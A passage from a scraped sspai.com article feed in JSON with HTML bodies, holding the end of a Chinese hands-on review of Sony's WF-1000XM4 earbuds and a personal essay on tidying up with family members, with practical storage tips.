<a href=\"https://sspai.com/post/55040\">少数派评论规范</a>。</li>\n</ul>\n<hr>\n<h2>兼具颜值与便携性的新「降噪豆」</h2>\n<p>焕然一新的感觉在收到快递的那一刻就扑面而来。</p>\n<p>WF-1000XM4 这次包装实现了从塑料到纸的转变，整体包装更小、更轻，要是放在两年前，我一定不会将这样的包装和耳机联系在一起。可能也正是因为这个朴素的包装，京东在配送过程中直接将 WF-1000XM4 的纸质包装盒塞在了塑料快递袋中，没有进行任何额外打包和防护。我运气比较好收到时包装盒仅凹了一个角，但据说有运气不那么好的首发用户。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/67580ac14ce49c1b2620cca98ee1ead1.png\"><figcaption>拆开快递袋就是这个纸盒</figcaption></figure><p>如果你和我一样选择的是铂金银配色，这种素雅的风格则会从外包装一路延伸至耳机本身——说是铂金银，实际上耳机和耳机盒的颜色在我看来都更加接近米白色，没有纯白色那种塑料感、也不至于因为颜色太深而显老气。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/e16a98153b794a0b010ca678e362c883.jpg\"><figcaption>铂金银配色</figcaption></figure><p>耳机盒打开时或绿、或橙、或红（代表不同的电量水平）的耳机盒电量提示灯，耳机主体金色的结构点缀以及红色的左右标识，都为这款从内到外都充满质感的耳机进行着点缀。</p>\n<p>或许是刚到手的新鲜感作祟，仔细端详这当中任何一处细节，都会让人暗自赞叹上一代产品发布过去这 2 年的时间，索尼并没有让咱们白等。这套全新的设计不仅让 WF-1000XM4 相比 WF-1000XM3 更接近「降噪豆」这一字面描述的对应形态，也更加让我确信手里的 Bose QuietComfort Earbuds 的确是上个世代的产品。</p>\n<p>对了 —— 别忘了耳机盒。WF-1000XM4 的耳机盒是现目前我手里所有真无线降噪耳机中最小、最精致、最适合带出门的，甚至比拥有鹅卵石手感的 Redmi AirDots 3 Pro 还要小。在这个环节，Bose QuietComfort Earbuds 那硕大如肥皂盒的耳机盒就真的有点喜感了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/666b9280c963aa7b5b91efb694010943.jpg\"><figcaption>耳机盒尺寸对比</figcaption></figure><p>不过 WF-1000XM4 的耳机盒有一个让我有些迷惑的设计：盒盖开关是两段式的。第一段半开合状态下的阻尼几乎没有，极易重新盖上；每次取用都得一口气将盒盖推到第二段才能靠机械结构的阻尼将其固定住，然后取出耳机。截至本文发布我也没想明白这个设计是出于什么考虑 —— 难道有人开一下盒盖仅仅只是为了查看一下耳机盒电量？不会吧？</p>\n<h2>算法飘忽不定，砍掉 NFC 并非小事</h2>\n<p>卖掉 Bose QuietComfort Earbuds 的想法，在进行到打开耳机盒、观赏 WF-1000XM4 耳机主体时都是一直未变的。进行到配对环节时，我的心态才悄然发生了一些变化。</p>\n<p>WF-1000XM4 砍掉了上一代「降噪豆」的 NFC。从设计和工业角度来说，这或许就是要获得玲珑身板所必须付出的代价。</p>\n<p>但在高呼「理解万岁」之前，请一定回想起 WF-1000XM3 当初被各位媒体老师们用来打趣甚至取笑过的配对方式：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/29/665e56b5afe725b57ab8766ed44db5d6.png\"><figcaption>大概就像这样 | 图：The Weeknd, Starboy</figcaption></figure><p>没有 NFC，意味着每次配对新设备时我们都必须一左一右戴上耳机，然后双手分别按住耳机两侧的触摸区域，长按、等待、不要放手……听到「蓝牙配对」的提示音后就能在手机上进行选择配对了。如果朋友问起刚刚过去这 5 秒你到底在干嘛，就告诉他是他说话太难听你不想听吧。</p>\n<p>WF-1000XM4 虽然采用了蓝牙 5.2 标准却不支持多设备同时连接，所幸在已经连接过的设备之间切换时不用捂耳朵，直接在记住的另一设备上选择连接就能快速切换。</p>\n<p>既然聊到了槽点，我们不妨在这一部分将所有不那么舒服的地方都写下来。</p>\n<p><strong>WF-1000XM4 现阶段的降噪算法有一个非常明显的瑕疵</strong>：戴上耳机、开启 LDAC 并切换到降噪模式，如果什么都不干，在没有媒体播放的情况下时不时会漏进一两声环境噪声，就像「通透模式」被不小心打开了 0.5 秒一样。</p>\n<p>我的固件版本为 1.1.5，上述情况在环境噪声比较明显或有高频背景声的情况下复现率极高。我也于 27 日通过微博与部分同样购买了 WF-1000XM4 的朋友确认过，基本可以确认这并非单个设备质量问题而是算法 bug。另外部分网友似乎很了解这一问题地说这是「通病」，也让我对索尼后续是否会通过固件推送修复这一问题感到担忧……</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/29/a747be3c703736f2a92ab1b71b45d582.png\"><figcaption>本文所描述的问题均以该版本为主</figcaption></figure><p>WF-1000XM4 的另一个问题就更加令人感到迷惑了。这一代产品改善了 WF-1000XM3 最受人诟病的通话质量问题，实测下来声音的确也从上一代的「勉强能听出来是个人类在说话」来到了略有失真但总体清晰的水平。</p>\n<p><strong>但 WF-1000XM4 在通话环节上的问题竟然从别人听不清变成了自己听不清了</strong>——又是一个我想不明白是为什么的考虑 —— WF-1000XM4 是我用过的所有真无线降噪耳机中唯一一款在通话时强制开启环境声模式的耳机。通话时对方倒是听清了，自己这边总得从耳机声音和环境声中努力区分，在闹市中想要靠它听清对方在说什么简直考验听力。</p>\n<p>当年用 WF-1000XM3 折磨朋友们的那笔孽债，终于还是还到了自己头上……</p>\n<h2>被最强降噪与 LDAC 掩盖的东西</h2>\n<p>除了迷惑的算法，出色的通透模式体验在上述 WF-1000XM4 通话问题中也有「无心之过」。因为 WF-1000XM4 的通透模式体验实在是太出色了。</p>\n<p>就像大家所期待的那样，搭载索尼自研 V1 芯片的 WF-1000XM4 拥有了当下真无线耳机门类中最出色的主动降噪体验，在大部分日常使用环境中，我已经很难区分出它和 Bose QC Earbuds 在降噪效果上的差异。</p>\n<p>这块芯片也在提供强大主动降噪能力的同时为它带来了可观的续航能力，WF-1000XM4 是那种带出门不需要担心续航的主动降噪耳机，在过去一周的使用过程中，即便降噪效果拉满、蓝牙传输设置为「音质优先」、开启 LDAC 和 DESS Extreme，我也从未有过将其耳机本体电量用尽的情况。</p>\n<p>值得一提的是耳塞采用了一种类似记忆海绵的新材质，个人还是很难从小号和中号之间找到一个适合自己的耳塞型号，最小号封闭性不足影响音质和降噪效果，中号则略大了些，佩戴过程中虽然不会带来明显不适，一段时间后取下还是会觉得耳道被挤得有些难受了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/29/article/29049282f95a726e2a1c46d9bce73dd8\"><figcaption>Headphones 主界面</figcaption></figure><p>不过也许正是因为新耳塞，音质方面倒也挑不出什么毛病了：低频饱满，中频充沛，非常适合当下大众的听音喜好，听雷女士（Lana Del Rey）的歌时表现和手里的 Bose QC Earbuds 相近，会觉得高频和人声略有欠缺，后续应该也和 Bose QC Earbuds 一样可以借助 Wavelet 来个一耳朵提升。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/e34ce91b20bba245ae570e2bc0efbfe6.jpg\"><figcaption>喜迎 Apple Music 无损串流</figcaption></figure><p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/65456\" target=\"_blank\">App+1 | 不懂均衡器调校也能量身定制，无需折腾的 Android 音效提升工具</a></p>\n<p>至于 LDAC 的补全，的确可以给参数党和器材党们提供更多可玩性，也让 WF-1000XM4 的售价变得相对合理了一些。但作为一个早年迷信过 LDAC 的人，我劝你还是不要在「搭配 Android 设备上使用蓝牙耳机」的音质上抱有期望，体验比音质更重要。</p>\n<p><strong>那 WF-1000XM4 体验最好的地方在哪里？个人认为是通透模式和免摘对话</strong>。</p>\n<p>如果每逢与人对话都得拿下耳机、用繁琐的触摸手势开启通透模式或在音乐、环境声混杂的声音中努力辨别对话内容，都算不上是好的交互体验。因此早年我一直认为通透模式对于降噪耳机而言是一个非常鸡肋的存在，现在才发现这是因为年轻时自己太内向了，并且也少有真无线降噪耳机能将这部分做好。</p>\n<p>在不播放任何音频的情况下使用 WF-1000XM4 的通透模式，你会发现外界声音和不佩戴耳机时能够听到的接近一致（声场上肯定还是会有差别的），而在播放音频时耳机和音乐本身又能提供足够的掩蔽效果，如果不是正对着高频噪声（比如开着抽油烟机炒菜），我会说 WF-1000XM4 的通透模式是一种既能让人注意周边环境、又能保留可观听歌体验的存在。</p>\n<p>背景噪声在通透模式下更像是播放底噪一般，能够与媒体播放并存，地铁报站、人声对话这类声音则能得到有效放大——如果你觉得环境声实在太吵，还可以在 Headphones 配套应用中选择进一步聚焦人声。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/29/00e2aadaeba61979d6689b48c3490558.png\"><figcaption>通透模式设置</figcaption></figure><p>和 Bose QC Earbuds 相比 WF-1000XM4 的通透模式差在不够干脆——在 Bose Music 配套应用中将触摸调节降噪效果的快捷方式设置为最大、最小两段之后，我就可以通过双击左侧耳机触摸区域的方式在通透和降噪中快速切换，毫不拖泥带水；WF-1000XM4 的切换方式更简单，只需要点击一次左侧耳机触摸区域即可，但每逢切换都得来一句完整的切换提示语音在实际使用场景下着实有些啰嗦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/25b026fbe3148a998800c9e8f58ad612.jpg\"><figcaption>降噪/通透切换做成触摸区域单击还是很赞的</figcaption></figure><p>相比之下免摘对话倒是可用性更高、反应也更加干脆利落，我十分建议你开启。开启后 WF-1000XM4 会在检测到我们说话的同时迅速进入通透模式，切换过程中仅有一段铃声提示，没有任何语音播报；同时 Headphones 应用也提供了非常丰富的灵敏度、通透效果和通透时长设定。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/29/a42ad7898c0152be38c2d9a7f9bb43ad.png\"><figcaption>免摘对话设置</figcaption></figure><p>个人体验下来还是对免摘对话的默认灵敏度挺满意的，正常的咳嗽、清嗓不会触发通透模式，正常音量的说话则能立即触发；更重要的是通过对话切换到通透模式后不用非得等待设置好的时长结束，如果你和身边的人对话完了，轻触一下耳机左侧触摸区域即可快速切换回降噪模式，同样不会有任何语音播报。</p>\n<h2>小结</h2>\n<p>就像今年我每逢出门都会在拥有长焦、2K 屏的 Pixel 4 XL 和拥有长续航、8G RAM 的 Pixel 5 之间纠结半小时左右一样，WF-1000XM4 现目前也并不是一款能够让我潇洒放下 Bose QuietComfort Earbuds 的产品——它的优点很明显，作为最新一代「降噪豆」的确也算得上是一款有诚意的作品，但降噪模式待机状态下的漏音问题实在是非常败好感，语音通话强制开启通透模式的设计也让我恼火。</p>\n<p>相比之下 Bose QuietComfort Earbuds 外观和功能性上虽然少了点「现代感」，但几乎不会给你一种基本体验还差点意思的感觉。</p>\n<p>有意思的是今年已经有不少先发布、再通过固件升级不断修补体验的真无线降噪耳机。并不是说这种做法不对，只是 WF-1000XM4 当前的表现并不完美，作为现今该门类下的「天花板」或者说「正确答案」级别的产品，我对它首发体验期望值其实是更高一点的。</p>\n<p>好在根据博主 @<a href=\"https://weibo.com/1748136774/KmeLLquFk\" target=\"_blank\">ZACKBUKS</a> 的消息，本文提到的 LDAC 下降噪频繁问题索尼这边已经在着手修复了，所以对于 WF-1000XM4 这样一款产品来说现在下定论似乎又为时尚早——对我个人而言，索尼的新「降噪豆」的确很不错，但在下一次固件推送前，我还是得把 Bose QuietComfort Earbuds 留在身边。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67466"},{"title":"以爱之名，和最重要的人一起整理","date":"2021-06-29 03:30:05","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>霍金曾说：「世界上最让人感动的，是遥远的相似性。」</p>\n<p>这句话完美地诠释了我与整理收纳的缘分。缘分的起点在时间的长河中日益模糊，那个从小学开始便沉浸于征服物品海洋的小女孩，也在一次次整理收纳中，愈发清晰和坚定自己内心所追逐和向往的未来。整理收纳之于我，是素未谋面但用情至深的老朋友，不论快乐忧伤，不论彷徨焦虑，一旦进入整理收纳状态，我便找到了舒适的安全区，学着停下来、慢下来，去独处，去思考，做物质的减法，做精神的加法。</p>\n<p>萌生为家人整理的想法是在五一假期前的一个午后，妈妈打电话来询问我关于家里装修的建议。我像往常一样：一边处理着手头的工作，一边听妈妈分享日常生活。忽然间，脑袋嗡地一下，如同被猛烈撞击一般闪过一个念头——也许我可以尝试着和家人一起整理！妈妈没有拒绝我的邀请，淡淡地答应着，我则在心里构想着完成整理收纳后的心动空间，期待着假期的到来。</p>\n<p>假期如约而至，几乎 3/4 的时间用于整理收纳，每晚都累到冲完凉只想慵懒地趴在床上做一条咸鱼，但也因为是实实在在陪伴家人整理过去的时光，内心感到无比温暖与幸福。以下是在整理收纳过程中，我所体会到的部分纯粹感动和由此引发的小小思考。希望可以用最真诚的笔触，让屏幕前滑过页面的你，感受到美好与治愈。</p>\n<h2>和妹妹一起整理</h2>\n<blockquote><p>比物品更重要的是物品所承载的与重要的人相处时留下的美好回忆</p></blockquote>\n<p>刚开始由于我和妹妹对物品的心动程度和判断能力有较大差距，使整理工作一度暂缓，整理氛围也持续低落。我不明白为什么妹妹还愿意留着十年前购入现在已经略显老旧的玩偶；许久不看现已积满灰尘的故事书；尘封已久、纸张发黄、字迹模糊的圣诞贺卡……妹妹觉得我太无情，怎么可以如此轻易把充满了纪念、回忆，曾经为之心动的物品丢弃？</p>\n<p>但转念一想，<strong>如果有些东西实在没法忽视，那么不如试着与它来个正面接触</strong><i><strong>。</strong></i>于是我默默整理完自己的物品，然后坐在一旁看着妹妹整理，不光用眼睛看，而是试着去触摸她的物品，感受物品握在手心的温度。虽然只是触摸这一个小动作，但我的抵触情绪明显消除了不少，仿佛那不再是「完全搞不明白为什么让妹妹恋恋不舍的物品」，而是变成了一个个具体的个体，变成了哆啦A梦挂件、小黄鸭胸章、权志龙明信片……</p>\n<p>毫无疑问，即使这些不是我自己的物品，但也是妹妹心爱的物件，是独立存在于这个空间的小小个体，它们和我一样，都是这个家庭的一部分。而不论关系多么亲密的家人，都应该保留并尊重对方的私人空间。因此，我试着不用评判的眼光去强制妹妹接受我的观点，尊重妹妹的私人空间，哪怕妹妹只是做了一点整理，我都及时赞扬，鼓励她继续加油。随着整理的深入，妹妹发现了越来越多有着我们共同回忆的物件：</p>\n<p>「老姐，你快看你写给我的信，太傻了吧！」</p>\n<p>「老姐，这条珍珠项链是我们去海边的时候买的！」</p>\n<p>「老姐，这是我小升初时 你写给我的鼓励贺卡哦！」</p>\n<p>「老姐，你看这是我们在韩国旅行的时候买的挂件！当时我求了好久，你才给我的呢！」</p>\n<p>「老姐，这是你去成都旅行带给我的小玩意儿，虽然有点旧了，但我还是好喜欢，一定要留着！」</p>\n<p>最终，妹妹整理出了一个箱子，郑重其事地拍拍箱子，用很惊喜的语气和我说：「老姐，我把你送我的并且还有心动感的礼物都放进这个箱子里，我发现你真的蛮疼我的。」<strong>我们一边整理着旧物件，一边重新回味当时收到礼物时怦然心动的感觉，慢慢明白时间往前走，但重要的人一直在身边，何其幸运！</strong></p>\n<h3>一点干货</h3>\n<h4><strong>文件收纳：能丢弃的坚决不留，让每份文件都找到自己的家</strong></h4>\n<p>一方面，我和妹妹同住一个房间，同样的空间，双倍的物品量；</p>\n<p>另一方面，我们采用的「堆叠法」使文件不断向上堆积，空间被无限使用，难以意识到其真实数量，以至于渐渐忽视底部文件的存在，越是下面的文件，使用率越低；</p>\n<p>再者，我们长期住校，难得假期回家时，更愿意做一条咸鱼，而不是耗费时间和精力去收纳。</p>\n<p>但是，家里装修和小长假提供了充分的理由和条件，让我们下定决心好好整理收纳一番文件。</p>\n<p>文件是什么呢？常见的有：证件、合同、说明书、会员卡、发票收据、房车房本、保险凭证、银行卡存折等。房间总是不知不觉积了各种文件，它们堆成一摞摞纸山，日复一日地堆积灰尘，风一吹就如同雪花般四散飞舞。</p>\n<p>那么面对繁多的文件，应该怎么整理收纳呢？</p>\n<p>我的步骤是：集中、清理、分类和收纳。</p>\n<p><strong>集中：</strong>把家中所有收纳场所放置的属于自己的文件集中在一起。注意：把床头柜、玄关柜、书桌抽屉、床底下的收纳箱里的文件一份不落地统统集中起来。</p>\n<p><strong>清理：</strong>秉持「能丢弃的坚决不留」的原则，对不符合「目前在使用」「短期内还会使用」「需要长期保存」这三项标准的文件，毫不犹豫地予以丢弃。</p>\n<p><strong>分类：</strong>留下的文件大致可以分为以下三类：</p>\n<ul>\n<li>待办文件：需要填写的表格、问卷，必须回复的信件，需要提交的纸质报告，计划浏览的报纸等；</li>\n<li>高频使用文件：课件讲义，读书笔记，工作事项安排表，经常翻阅的杂志等；</li>\n<li>低频使用文件：房产证、租赁合同、保险凭证等。</li>\n</ul>\n<p><strong>收纳：</strong>为不同类型的文件选择合适的收纳用品。</p>\n<h4>待办文件：用「透明塑料/磨砂A4文件收纳盒」打造待办专区</h4>\n<p>透明的箱体有利于更加直观地看到文件的形态，节约寻找物品的时间；塑料材质的盒子价格相对实惠；磨砂材质的耐脏性比塑料材质要强，且外观更有质感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/ca13544a7e4fabfc478654da4633b1a5\"><figcaption>图片来自淘宝</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/8cce55b0c2ffd1db4b3cf6af26183ecd\"><figcaption>图片来自淘宝</figcaption></figure><h4>高频使用文件：一个「透明风琴夹」即可收纳全部</h4>\n<p>原因：此类物品数量多，且种类杂，因此如果能用翻书的状态去收纳此类文件，有利于提高使用的便捷性，透明风琴夹不仅可以满足这种需求，而且能够最直接表现文件的形态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/2f8ab8079a1af320ae7f4e2ba57d39fb\"><figcaption>图片来自淘宝</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/ad43ae6797560e44dcaa42983d71bcc8\"><figcaption>图片来自淘宝</figcaption></figure><h4>低频使用文件：一个「透明文件袋」即可收纳全部</h4>\n<p>此类文件的数量较少，需要主动取出使用的机会少，并且需要妥善保管，因此只需统统放入普通的透明文件袋即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/2c191fa58e4f853fb7de954dd5cd27ef\"><figcaption>图片来自淘宝</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/727a6f54db528b01d0bfd43dcb46551c\"><figcaption>图片来自淘宝</figcaption></figure><h2>和妈妈一起整理</h2>\n<blockquote>\n<p>尝试接触所拥有的物品并与其真诚沟通 可以找到自己生活的痕迹</p>\n<p>从而更加了解自己 从物品上得到的正向反馈 会让你更加肯定自己</p>\n</blockquote>\n<p>一方面是客观的时代背景，我的爸爸妈妈生于物质相对匮乏的70年代，在他们的内心深处或多或少、或深或浅都有着「匮乏感」；另一方面是主观的意识宣传：扔东西=浪费、糟蹋东西，是可耻的行为。因此如果把还有使用价值的物品丢弃，会让他们产生罪恶感。</p>\n<p>就像我们小时候不喜欢听大人讲道理一样，父母们随着年岁渐长，感官功能会逐渐降低，他们的感受、反应和认知也会慢慢弱化。<strong>这时候，需要我们像对待孩子那般有耐心，少讲道理，多进行情感链接。因为通常道理的背后都隐藏着有关「对错」的评判。摆事实、讲道理、分对错的线性思维适用于工作，但不适于亲情。</strong>所以不要一上来就试图扔父母的东西，而是尝试着站在他们的角度去看待这些「囤货」，比如问问她为什么还留着泛黄的书籍，说不定会听到一段温情的故事。</p>\n<p><strong>场景一：</strong>无法舍弃朋友在十年前写的信件</p>\n<p>妈妈：「没有心动感，但觉得是朋友的心意，很难舍弃。」</p>\n<p>我：「那么可以握在手心里，感受纸张的温度，思考从前的祝福是否是你未来想要继续拥有的。如果已经拥有了，或者不再是自己的向往，那么就轻轻关上 感谢朋友的心意。」</p>\n<p><strong>场景二：</strong>发现朋友送的直到过期还未使用的福字挂历，感到非常愧疚</p>\n<p>妈妈：「宝贝儿，妈妈觉得挺不好意思的，我之前都没有注意到它，挂历都过期积灰了。」</p>\n<p>我：「我想对方的真正用意是想把福气送给你，那么ta的目的已经达到了。 你现在生活得很幸福，或许就不再需要一幅实物去提醒你，所以我们现在可以把这个挂历送给有缘人。」</p>\n<p><strong>场景三：</strong>无意间发现了记录了3年并且从未间断的日记</p>\n<p>妈妈：「宝贝儿，我发现自己挺厉害的诶！写了3年的日记，一天都没有落下，你妈妈还是很有毅力的！」</p>\n<p>我：「对啊，那我们把日记都按年份排好，贴上标签，以后你可以常常翻看。」</p>\n<p><strong>场景四：</strong>在帮妈妈排列留下的书籍时，发现妈妈留下的大部分是和家庭教育有关的书籍，并且有些是在我读幼儿园的时候就购入的</p>\n<p>我：「老妈，你怎么留了这么多教育书籍，看得完嘛？」</p>\n<p>妈妈：「看得完啊，你们永远是妈妈不断学习的动力，把你们都教育好，是我最大的成就！」</p>\n<p>一瞬间，从前妈妈和我说过的一段话仿佛穿过遥远的时空，在脑海里重现，原来妈妈从来都不是说说而已。</p>\n<p>「我也是第一次做妈妈，没有考试，所以我也不确定自己是不是一个好妈妈。 但我会尽我全力，争取做一个合格的妈妈！」</p>\n<p>谢谢你，冥冥之中选中了我，我最爱最爱的妈妈！</p>\n<h3>一点干货</h3>\n<h4>衣柜收纳：能挂起的坚决不叠，让每件衣服都找到自己的家</h4>\n<p>在为妈妈整理房间的过程中，最让她惊喜的是「衣柜收纳」环节。在一次次用心触摸衣服，感受衣服带给内心的真实感受后，她慢慢发现：整理的初衷不是选择「要丢弃的东西」，而是选择「想要它继续陪伴自己并且能够珍惜的物品」。</p>\n<p>那么应该怎么展开衣橱的收纳呢？我认为可以分成以下三步：集中处理、确定弃留、设定位置</p>\n<p><strong>集中处理：</strong>把自己在家中所有收纳场所存放的衣服都集中在一起，无论是衣柜、抽屉、收纳箱还是阳台晾晒的干衣服都一件不落地集中起来，正在洗涤的衣服无需理会。</p>\n<p>当我们将分散在各个角落的同类物品集中在一起，通常会震惊于物品的实际拥有量远远超过自己的想象。并且有利于我们找出款式相同或相似的物品，从而更快做出「舍弃」还是「留存」的选择。</p>\n<p>而我们将物品从封闭的空间取出，并放置在有新鲜空气流通的地方，有利于将物品从沉睡的状态中唤醒，提高我们对物品的判断力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/2137ce9c6ec56a109d9a9203b493083e\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/96c6664082021e12a5f0ed8acffc4cf4\"><figcaption>看到自己拥有的衣服数量后，妈妈表示非常震惊</figcaption></figure><p><strong>确定弃留：</strong>将衣服一件件拿在手中，认真触摸，感受物品带给自己的感觉。如果有「怦然心动」的温暖、正向的感觉就果断留下；如果不再有留恋，那么则怀着感恩之心表达对衣服的感谢。</p>\n<p>「怦然心动」听起来有些抽象，但它并不仅仅局限于「讨人喜欢」「感觉心跳加速」这类朴素而简单的魅力。它是简单的设计传递出来的「安心感」；功能多样的「便利性」；难以言喻的「恰好合适」，以及具有「使用价值」等，这些才是对「怦然心动」的客观评价。</p>\n<p>某种程度上，我们和物品的关系就像人与人之间的缘分一样，并非所有衣服都是因为要被完全穿坏才来到我们身边，而和我们相遇的人也并不都会成为朋友或恋人。但正是因为有些人让我们觉得「相处起来不那么舒服」，我们才会更加体会到另外一些人的重要性，然后更想要去好好珍惜。所以，对于那些「没有心动感也不愿丢弃」的物品，要认真地思考它们真正的功能。也许就会发现其实有很多物品已经完成了使命，自己才能更坦然地面对它们，在对其表示谢意后轻松放手，这样才算整理好了我们与物品的关系。经过这样的过程留下来的物品才是我们真正喜爱且珍惜的。</p>\n<p>通过这个过程，我们会明白：整理并不是单纯的有关丢和留的话题，而是一种让自己正视与物品的关系并不断调整，直到达到舒适状态的过程。</p>\n<p><strong>设定位置：</strong>衣架收纳 &amp; 折叠收纳</p>\n<p>能挂起的衣服按照「从左到右 重量越来越小 长度越来越短 材质越来越轻薄 颜色越来越浅」的挂法：不容易被翻乱；不容易被压变形；不容易有褶皱。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/a070509afffeb784ac027b35404ddd03\"><figcaption>帮妈妈整理衣柜后的效果图</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/1bc1e93068f7441bd634ac3e362d3894\"><figcaption>来自于百度</figcaption></figure><p>不能挂起的衣服则采用折叠收纳，原则是「颜色从深到浅或从浅到深」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/c2d0dc4e30227c0b64ed9a12c0efbf17\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/41b0ea289c4f85bb61f97b6aaabafdaf\"><figcaption>帮舍友整理衣柜后的效果图</figcaption></figure><p>内衣采用「由内到外 颜色越来越深」；内裤采用「由内到外 颜色越来越浅」的顺序摆放：</p>\n<ul>\n<li>内衣的属性是金，颜色越深品质越好，那么越靠近人拿取的位置，内衣的颜色应该越鲜艳；</li>\n<li>内裤的属性是水，颜色越浅水越澄澈，那么越靠近人拿取的位置，内裤的颜色应该越素雅。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/article/735a3942a17e7e02c7ea4d6f208ef09e\"><figcaption>帮妈妈整理衣柜后的效果图</figcaption></figure><h2>和爸爸一起整理</h2>\n<blockquote>\n<p>每个人的身上不可避免地都带有原生家庭的痕迹</p>\n<p>学会坦然去接受不同的价值观 才算真正完成了整理</p>\n</blockquote>\n<p>看到我和妈妈整理的累累战绩，激起了一直处于旁观状态的爸爸的整理热情，他心血来潮——提议一家人一起整理旧照片。</p>\n<p>于是乎，我在爸爸妈妈房间里翻箱倒柜，最终从衣柜、书桌、床头柜等区域的犄角旮旯翻出了「平铺占地 2 平方米，厚度约 2 厘米」的旧照片。一家人盘腿围坐在照片群四周，看着眼前的庞然大物，随意拿起其中的一张照片，仿佛那年那月那天穿过遥远的时光隧道，和现在的自己打了个照面。于是乎，我灵机一动：不如今天就来制作心动相册吧！</p>\n<h3>一点干货：</h3>\n<p>照片收纳：只留下心动的照片，比怀念过去更重要的是，珍惜当下的生活</p>\n<ol>\n<li>挑选相册，确定容量。爸爸妈妈选择了玫瑰色封面，印有金边纹理的正方形相册，看起来典雅大气。每面可以存放6张照片，整本相册一共可以收纳120张照片。</li>\n<li>所有照片集中一起，一张张拿起挑选，只留下让自己感到心动的照片，留下的照片则按照「个人 夫妻 家人 朋友」进行分类。</li>\n<li>再次，舍弃的照片不要直接地粗暴丢弃，而要怀着感恩之心，感谢它曾记录过的美好瞬间，欢迎它有缘再来家里做客。</li>\n</ol>\n<p>陆陆续续整理了三小时，最终整理出了3本相册，清理掉「不必要 不合适 不愉快」的回忆，留下了真正有心动感的回忆。或许人是一个很抽象的个体，但却可以通过整理与人密切相关的物品，收获意外的发现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/04/ce399daac9b45057c0cee9b6ca87bc5a.jpg\"><figcaption>一家人一起整理照片</figcaption></figure><p><strong>发现一：</strong>整理旧照片的过程中，爸爸基本上不会舍弃照片，即便是重复的照片，想要做到心无旁骛的断舍离是十分困难的。这让我联想到平日里爸爸采购日用品是食品，都是囤货级别，虽然我和妈妈都有过提醒，但并无作用。仔细想想或许这和爸爸小时候生活的环境有关：生活在物质匮乏的年代，童年甚至少年时代对物质的需求无法满足。成年后具备了一定的经济能力，就通过囤积物品的方式来寻求慰藉、满足自己的内在小孩。</p>\n<p><strong>发现二：</strong>爸爸留下的基本上都是和夫妻、家庭和家族有关照片，也许对他来说：家庭永远是第一位的，是骨子里化不开的牵挂与归属。</p>\n<p><strong>发现三：</strong>小时候因为工作的关系，爸爸妈妈给予的陪伴并不多，我内心深处总会觉得自己的童年多少有些不圆满。但通过整理照片才深刻意识爸爸妈妈从未缺席我的童年，只是年代太久远了，我记不清。</p>\n<h2>写在结尾</h2>\n<p>经过 3 天的兵荒马乱，我离开家返回学校，原本以为家里的整理就此告一段落，没想到爸爸妈妈开始独立整理家里的厨房、阳台、洗手间等地方，并且连着几天和我远程分享收纳「成果」。</p>\n<p>大约在我返校的 5 天后，爸爸妈妈的生活归于平静，他们终于可以闲下来安安心心地伫立阳台边，缓缓喝着热茶，看夕阳西下。妈妈给我发来家里小猫吃饭、玩耍、睡觉的照片，看着小肥慵懒、惬意的模样，我不禁感慨：「连小肥都能这么安逸闲适地生活着，真好！」</p>\n<p>我想着这大抵就是整理收纳教会我的宝贵道理——做物质的减法，做精神的加法，珍惜习以为常的平凡生活，才能让每一天都过得怦然心动。</p>\n<p> </p>\n","link":"https://sspai.com/post/67046"},{"title":"派早报：首个 Windows 11 预览版本上线、Apple Pay 快捷交通卡支持亿通行等","date":"2021-06-29 